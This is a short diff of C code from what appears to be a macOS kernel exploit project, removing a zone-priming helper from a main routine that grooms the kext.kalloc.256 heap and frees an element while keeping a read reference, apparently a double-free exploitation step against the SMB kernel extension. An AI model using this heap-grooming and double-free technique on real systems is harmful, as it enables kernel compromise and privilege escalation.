@@ -37,7 +37,6 @@
 #include "memory/zkext_free.h"
 #include "memory/zkext_alloc_small.h"
 #include "memory/allocator_rw.h"
-#include "memory/zkext_prime_util.h"
 
 #include "public/xe_kmem/smbx_conf.h"
 
@@ -203,10 +202,6 @@ int main(void) {
     //           in kext.kalloc.256 zone, it will also get released by `smb2_mc_release_interface_list`
     uint num_nbpcb_rw_capture_allocations = 512;
     kmem_allocator_rw_t nbpcb_rw_capture_allocator = kmem_allocator_rw_create(&smb_addr, num_nbpcb_rw_capture_allocations / 2);
-    
-    // TODO: check and scrub
-//    kmem_zkext_prime_util_t pre_allocator = kmem_zkext_prime_util_create(&smb_addr);
-//    kmem_zkext_prime_util_prime(pre_allocator, 128, 255);
     
     xe_log_debug("begin free of allocated kext.256 element retaining read reference");
     kmem_zkext_free_session_execute(nbpcb_free_session, &double_free_nic);
